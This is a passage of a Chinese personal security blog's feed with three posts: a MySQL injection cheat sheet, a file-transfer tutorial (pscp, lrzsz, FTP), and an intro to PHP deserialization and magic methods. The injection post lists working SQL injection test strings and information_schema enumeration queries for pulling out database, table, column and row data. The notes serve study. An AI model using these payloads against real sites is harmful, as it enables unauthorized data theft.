      <category term="Web Security" scheme="https://xianyu123.me/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>mysql注入备忘录</title>
    <link href="https://xianyu123.me/2019/01/25/mysql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>https://xianyu123.me/2019/01/25/mysql注入备忘录/</id>
    <published>2019-01-25T13:57:42.000Z</published>
    <updated>2019-05-11T12:52:58.623Z</updated>
    
    <content type="html"><![CDATA[<p>mysql注入备忘录</p><a id="more"></a><h1 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h1><h2 id="查看当前数据库版本"><a href="#查看当前数据库版本" class="headerlink" title="查看当前数据库版本"></a>查看当前数据库版本</h2><ul><li>version()</li><li>@@version</li><li>@@global.version</li></ul><h2 id="当前登录用户"><a href="#当前登录用户" class="headerlink" title="当前登录用户"></a>当前登录用户</h2><ul><li>user()</li><li>current_user()</li><li>system_user()</li><li>session_user()</li></ul><h2 id="当前使用的数据库"><a href="#当前使用的数据库" class="headerlink" title="当前使用的数据库"></a>当前使用的数据库</h2><ul><li>database()</li><li>schema()</li></ul><h2 id="路径相关"><a href="#路径相关" class="headerlink" title="路径相关"></a>路径相关</h2><ul><li>@@BASEDIR : mysql安装路径：</li><li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：</li><li>@@DATADIR : 数据存储路径：</li><li>@@CHARACTER_SETS_DIR : 字符集设置文件路径</li><li>@@LOG_ERROR : 错误日志文件路径：</li><li>@@PID_FILE : pid-file文件路径</li><li>@@BASEDIR : mysql安装路径：</li><li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：</li></ul><h2 id="联合数据"><a href="#联合数据" class="headerlink" title="联合数据"></a>联合数据</h2><ul><li>CONCAT()</li><li>GROUP_CONCAT()</li><li>CONCAT_WS()</li></ul><h2 id="字母-数字相关"><a href="#字母-数字相关" class="headerlink" title="字母/数字相关"></a>字母/数字相关</h2><ul><li>ASCII(): 获取字母的ascii码值</li><li>BIN(): 返回值的二进制串表示</li><li>CONV(): 进制转换</li><li>FLOOR()</li><li>ROUND()</li><li>LOWER()：转成小写字母</li><li>UPPER(): 转成大写字母</li><li>HEX():十六进制编码</li><li>UNHEX()：十六进制解码</li></ul><h2 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h2><ul><li>mid()</li><li>substr()</li><li>substring()</li><li>left()</li><li>right()</li></ul><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><ul><li>– (后面有一个空格)</li><li>#</li><li>/**/</li></ul><h1 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h1><h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><p>假设网址为<code>www.xxx.com/test.php?id=1</code></p><h3 id="数值型注入"><a href="#数值型注入" class="headerlink" title="数值型注入"></a>数值型注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1+1</span><br><span class="line">id=-1 or 1=1</span><br><span class="line">id=-1 or 3-1</span><br><span class="line">id=1 and 1=1</span><br><span class="line">id=1 and 1=2</span><br></pre></td></tr></table></figure><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1'</span><br><span class="line">id=1"</span><br><span class="line">id=1' or '1'='1</span><br><span class="line">id=1" or "1"="1</span><br></pre></td></tr></table></figure><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><h3 id="库"><a href="#库" class="headerlink" title="库"></a>库</h3><h4 id="库名长度"><a href="#库名长度" class="headerlink" title="库名长度"></a>库名长度</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">database</span>())</span><br></pre></td></tr></table></figure><h4 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. database()</span><br><span class="line">2. schema()</span><br></pre></td></tr></table></figure><h3 id="表"><a href="#表" class="headerlink" title="表"></a>表</h3><h4 id="表的张数"><a href="#表的张数" class="headerlink" title="表的张数"></a>表的张数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#表张数 &lt; 10</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=库名的十六进制</span><br><span class="line"></span><br><span class="line">#表张数 &gt;= <span class="number">10</span></span><br><span class="line"><span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="number">0x74657374</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">49</span></span><br></pre></td></tr></table></figure><h4 id="表名的长度"><a href="#表名的长度" class="headerlink" title="表名的长度"></a>表名的长度</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.借助limit求表名长度的方法</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">length</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=库名的十六进制 <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>))),<span class="number">1</span>,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>借助<span class="keyword">group_concat</span>求表名长度的方法</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">mid</span>(<span class="keyword">length</span>((<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="number">0x74657374</span>)),<span class="number">1</span>,<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 这种方法需要借助limit，这种方法需要注入出表的张数，也需要注入出表名的长度 </span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=库名的十六进制 <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 不需要借助<span class="keyword">limit</span>,一次性列出所有的表名，这种方法需要注入出表名的长度，不需要注入出表的张数</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=库名的十六进制</span><br></pre></td></tr></table></figure><h3 id="列"><a href="#列" class="headerlink" title="列"></a>列</h3><h4 id="列的个数"><a href="#列的个数" class="headerlink" title="列的个数"></a>列的个数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#列个数 &lt; 10</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=表名的<span class="number">16</span>进制</span><br><span class="line"></span><br><span class="line">#列个数 &gt;= <span class="number">10</span></span><br><span class="line"><span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=表名的<span class="number">16</span>进制),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">49</span></span><br></pre></td></tr></table></figure><h4 id="列名的长度"><a href="#列名的长度" class="headerlink" title="列名的长度"></a>列名的长度</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.借助limit求列名长度的方法</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">length</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=表名的<span class="number">16</span>进制 <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>))),<span class="number">1</span>,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>借助<span class="keyword">group_concat</span>求列名长度的方法</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">mid</span>(<span class="keyword">length</span>((<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=表名的<span class="number">16</span>进制)),<span class="number">1</span>,<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 这种方法需要借助limit，这种方法需要注入出列的张数，也需要注入出列名的长度 </span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=表名的<span class="number">16</span>进制 <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 不需要借助<span class="keyword">limit</span>,一次性列出所有的列名，这种方法需要注入出列名的长度，不需要注入出列的个数</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=表名的<span class="number">16</span>进制</span><br></pre></td></tr></table></figure><h3 id="值"><a href="#值" class="headerlink" title="值"></a>值</h3><h4 id="值的个数"><a href="#值的个数" class="headerlink" title="值的个数"></a>值的个数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> 表名 <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="值的长度"><a href="#值的长度" class="headerlink" title="值的长度"></a>值的长度</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.借助group_concat求值长度的方法</span><br><span class="line">ascii(mid(length((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">id</span>,<span class="keyword">name</span> separator <span class="number">0x2c</span>) <span class="keyword">from</span> test.te_student1)),<span class="number">1</span>,<span class="number">1</span>)))</span><br></pre></td></tr></table></figure><h4 id="值-1"><a href="#值-1" class="headerlink" title="值"></a>值</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(字段<span class="number">1</span>,字段<span class="number">2</span> separator <span class="number">0x2c</span>) <span class="keyword">from</span> 库名.表名</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mysql注入备忘录&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="https://xianyu123.me/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>分享几个windows和linux文件传输的方法</title>
    <link href="https://xianyu123.me/2018/12/31/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AAwindows%E5%92%8Clinux%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>https://xianyu123.me/2018/12/31/分享几个windows和linux文件传输的方法/</id>
    <published>2018-12-31T10:11:17.000Z</published>
    <updated>2019-05-11T12:52:58.626Z</updated>
    
    <content type="html"><![CDATA[<p>小白的学习笔记，大佬们不要喷我</p><a id="more"></a><h1 id="pscp"><a href="#pscp" class="headerlink" title="pscp"></a>pscp</h1><p><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html" target="_blank" rel="noopener">PuTTY官网下载地址</a></p><p><code>pscp.exe</code>是<code>PuTTY</code>自带的工具，它是一个命令行工具，使用格式和scp命令相类似</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 把本地当前目录下1.txt复制到远程家目录下的 Desktop/1.txt</span><br><span class="line"><span class="meta">#</span> 注意：`:`后面的路径如果不是绝对路径，则以用户的家目录作为参照路径</span><br><span class="line">pscp -P port 1.txt user@remote:Desktop/1.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 把远程家目录下的 Desktop/1.txt 文件复制到本地当前目录下的1.txt</span><br><span class="line">pscp -P port user@remote:Desktop/1.txt 1.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 加上 -r选项可以传送文件夹</span><br><span class="line"><span class="meta">#</span> 把当前目录下的demo文件夹复制到远程家目录下的Desktop</span><br><span class="line">pscp -P port -r demo user@remote:Desktop</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 把远程家目录下的Desktop复制到当前目录下的demo文件夹</span><br><span class="line">pscp -P port -r user@remote:Desktop demo</span><br></pre></td></tr></table></figure><p><code>user</code>是在远程机器上的用户名，如果不指定的话默认为当前用户</p><p><code>remote</code>是远程机器的地址，可以是<strong>IP/域名</strong>，或者是<strong>别名</strong></p><p><code>port</code>是<strong>SSH Server监听的端口</strong>，如果不指定，就为默认值<code>22</code></p><h1 id="lrzsz（使用sz与rz命令）"><a href="#lrzsz（使用sz与rz命令）" class="headerlink" title="lrzsz（使用sz与rz命令）"></a>lrzsz（使用sz与rz命令）</h1><p>Centos安装命令：<code>yum install -y  lrzsz</code></p><p>Ubuntu安装命令：<code>sudo apt-get install lrzsz</code></p><p> 其中，对于<code>sz</code>和<code>rz</code>的理解与记忆我用了如下的方法（很多时候容易搞混）：</p><p>当我用<code>Xshell</code>连上服务器的时候，我所有执行的命令都是服务器的命令，所以对于服务器来说：</p><p>要把文件发送给客户端用的是<code>sz(send to cilent)</code>，也就是客户端下载文件</p><p>从客户端接收文件用的是<code>rz(received by cilent)</code>，也就是客户端上传文件</p><h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><p>方法1：将需要上传的文件拖动到xshell界面即可，就可以将你拖动的所以文件直接上传到你的Linux服务器当前所在的目录中</p><p>方法2：输入<code>rz</code>，然后回车，就会弹出文件夹浏览器，可以选择文件</p><p><code>注意：只能上传文件，不能上传文件夹</code> </p><h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><p>命令：<code>sz filenmae</code></p><p>注意一定要加上filename ，单独的sz是不生效的</p><p><code>注意：下载时仅仅能选择文件，不能选择目录。否则会出现报错：“：is not a file XXX can’t open any requested files”</code></p><h1 id="FTP服务上传"><a href="#FTP服务上传" class="headerlink" title="FTP服务上传"></a>FTP服务上传</h1><p>有了前面两种上传方式就OK了，我不是很喜欢用FTP服务与Linux传输文件，不过这也是一种方法。</p><p>下面是<code>WinSCP</code>和<code>FileZilla</code>的下载地址及使用教程</p><p><a href="https://winscp.net/eng/download.php" target="_blank" rel="noopener">WinSCP官网下载地址</a>      <a href="https://blog.csdn.net/whatday/article/details/52913908" target="_blank" rel="noopener">WinSCP使用</a></p><p><a href="https://filezilla-project.org/download.php?type=client" target="_blank" rel="noopener">FileZilla官网下载地址</a>      <a href="https://blog.csdn.net/xqhrs232/article/details/50961104" target="_blank" rel="noopener">FileZilla客户端如何使用</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;小白的学习笔记，大佬们不要喷我&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://xianyu123.me/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈php反序列化漏洞</title>
    <link href="https://xianyu123.me/2018/12/11/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://xianyu123.me/2018/12/11/浅谈php反序列化漏洞/</id>
    <published>2018-12-11T10:57:42.000Z</published>
    <updated>2019-05-11T12:52:58.628Z</updated>
    
    <content type="html"><![CDATA[<p>php反序列化漏洞，也叫php对象注入</p><p>php反序列化漏洞学习<br>合上吧，没有新姿势。</p><a id="more"></a><h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><p>php中有两个函数<a href="http://php.net/manual/zh/function.serialize.php" target="_blank" rel="noopener">serialize()</a>和<a href="http://php.net/manual/zh/function.unserialize.php" target="_blank" rel="noopener">unserialize()</a></p><h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h2><p>把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等。测试代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xianyu</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> xianyu();</span><br><span class="line">$class_ser = serialize($class);</span><br><span class="line">print_r($class_ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化打印的结果为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">"xianyu"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">3</span>:<span class="string">"123"</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h2><p>恢复原先被序列化的变量，测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xianyu</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $test = <span class="string">'123'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="string">'O:6:"xianyu":1:&#123;s:4:"test";s:3:"123";&#125;'</span>;</span><br><span class="line">$class_unser = unserialize($class);</span><br><span class="line">print_r($class_unser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化的打印结果如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xianyu Object ( [test] =&gt; <span class="number">123</span> )</span><br></pre></td></tr></table></figure><p><strong>反序列化的数据本质上来说是没有危害的</strong></p><p><strong>用户可控数据进行反序列化是存在危害的</strong></p><p>可以看到，反序列化的危害，关键还是在于可控或不可控。</p><h1 id="PHP（反）序列化有关的常用魔法函数"><a href="#PHP（反）序列化有关的常用魔法函数" class="headerlink" title="PHP（反）序列化有关的常用魔法函数"></a>PHP（反）序列化有关的常用魔法函数</h1><h2 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h2><p>创建一个新的类时，自动调用该方法</p><p><img src="http://images.xianyu123.club/construct.png?imageslim" alt></p><h2 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h2><p>当一个类被销毁时自动调用该方法</p><p><img src="http://images.xianyu123.club/destruct.png?imageslim" alt></p><h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h2><p>当把一个类当作字符串使用时就会自动调用该方法</p><p><img src="http://images.xianyu123.club/toString.png?imageslim" alt></p><h2 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h2><p>当调用<code>serialize()</code>函数时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这样就允许对象在被序列化之前做任何清除操作</p><p><img src="http://images.xianyu123.club/sleep.png?imageslim" alt></p><h2 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h2><p>当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数<br>unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。返回的是转换之后的值，可为 integer、float、string、array 或 object。如果传递的字符串不可解序列化，则返回 FALSE。</p><p><img src="http://images.xianyu123.club/wakeup.png?imageslim" alt></p><h2 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h2><p>当把一个类当作函数使用时，就会自动调用该方法</p><p>仅在<code>php5.30+</code>支持</p><p><img src="http://images.xianyu123.club/invoke.png?imageslim" alt></p><p>更多关于php魔术方法的使用请参考<a href="http://php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">php魔术方法</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php反序列化漏洞，也叫php对象注入&lt;/p&gt;
&lt;p&gt;php反序列化漏洞学习&lt;br&gt;合上吧，没有新姿势。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="https://xianyu123.me/categories/Web-Security/"/>
    
    
  </entry>
  
</feed>
